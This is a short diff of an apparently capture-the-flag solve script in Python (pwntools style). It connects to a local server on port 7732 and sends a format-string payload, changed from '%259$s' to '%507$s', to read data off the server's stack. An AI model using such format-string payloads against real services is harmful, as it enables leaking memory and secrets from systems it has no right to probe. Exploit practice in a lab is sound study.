@@ -25,7 +25,7 @@ def fuzzing():
 def solve():
     server_ip = "localhost"
     con = remote(server_ip,7732)
-    con.sendline(b'%259$s')
+    con.sendline(b'%507$s')
     print(con.recvall())
 
 solve()
